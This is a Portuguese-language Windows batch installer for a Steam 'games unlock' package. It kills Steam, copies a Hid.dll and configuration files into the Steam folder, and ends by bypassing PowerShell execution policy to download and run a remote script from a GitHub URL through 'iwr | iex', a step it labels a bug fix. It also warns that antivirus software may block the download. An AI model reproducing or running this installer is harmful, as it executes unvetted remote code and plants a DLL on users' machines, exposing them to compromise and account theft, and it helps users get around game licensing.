@echo off
setlocal EnableDelayedExpansion
:: Força o BAT a trabalhar na pasta onde ele está (vital para achar o ZIP)
cd /d "%~dp0"
chcp 65001 >nul
title Instalador SNYX
mode con: cols=100 lines=30

:: =====================================================
:: CONFIGURAÇÕES INTERNAS
:: =====================================================
set "ARQUIVO_ZIP=Pmw games unlock.zip"
set "URL_FIX=https://raw.githubusercontent.com/KRAYz-Oficial/KRAYz-Oficial/67065f398be63e1fe2c29ef2838f3030490eb3b6/Remover-bugs.ps1"

:: =====================================================
:: 1. VERIFICAÇÃO DE INTEGRIDADE
:: =====================================================
if not exist "%ARQUIVO_ZIP%" (
    cls
    color 0C
    echo.
    echo  [ERRO CRITICO] O arquivo "%ARQUIVO_ZIP%" não foi encontrado na pasta SNYX_WORK.
    echo  Verifique se o download foi bloqueado pelo Antivirus.
    echo.
    pause
    exit /b
)

:: =====================================================
:: 2. DETECTAR CAMINHO DA STEAM
:: =====================================================
cls
echo.
echo  [INFO] Buscando diretório da Steam no Registro...

for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do (
    set "steamExe=%%A %%B"
)

if not defined steamExe (
    color 0C
    echo.
    echo  [ERRO] A Steam não foi encontrada.
    pause
    exit /b
)

for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

:: =====================================================
:: 3. INSTALAÇÃO AUTOMÁTICA
:: =====================================================
color 0A
echo.
echo  [OK] Steam localizada em: %steamDir%
echo  [OK] Pacote de dados pronto.
echo.
echo  Iniciando instalacao automatica...
timeout /t 2 >nul

call :BarraProgresso

:: Fecha a Steam
echo.
echo  [-] Encerrando processos da Steam...
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 >nul

:: Extração
echo  [+] Extraindo arquivos...
if exist "%temp%\pmw_temp" rmdir /s /q "%temp%\pmw_temp"

:: Extrai o ZIP que o Python baixou na mesma pasta
powershell -Command "Expand-Archive -Path '%ARQUIVO_ZIP%' -DestinationPath '%temp%\pmw_temp' -Force"

:: Cópia dos Arquivos
echo  [+] Copiando configurações para a Steam...
xcopy /e /i /y "%temp%\pmw_temp\Config\*" "%configDir%\" >nul
copy /y "%temp%\pmw_temp\Hid.dll" "%steamDir%\" >nul

:: Limpeza de Temporários
rmdir /s /q "%temp%\pmw_temp" >nul

:: Reabre a Steam
echo  [+] Reiniciando Steam...
start "" "%steamExe%"

:: =====================================================
:: 4. FINALIZAÇÃO
:: =====================================================
echo.
echo  [+] Executando script de correcao online...
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb '%URL_FIX%' | iex"

echo.
echo ========================================================
echo         INSTALACAO FINALIZADA COM SUCESSO!
echo ========================================================
echo.
echo  Esta janela fechara sozinha em 5 segundos...
timeout /t 5 >nul
exit

:BarraProgresso
cls
echo.
echo  Processando instalacao SNYX...
echo.
echo  [#####               ] 25%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Processando instalacao SNYX...
echo.
echo  [##########          ] 50%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Processando instalacao SNYX...
echo.
echo  [###############     ] 75%%
timeout /t 1 /nobreak >nul
cls
echo.
echo  Processando instalacao SNYX...
echo.
echo  [####################] 100%%
timeout /t 1 /nobreak >nul
goto :eof
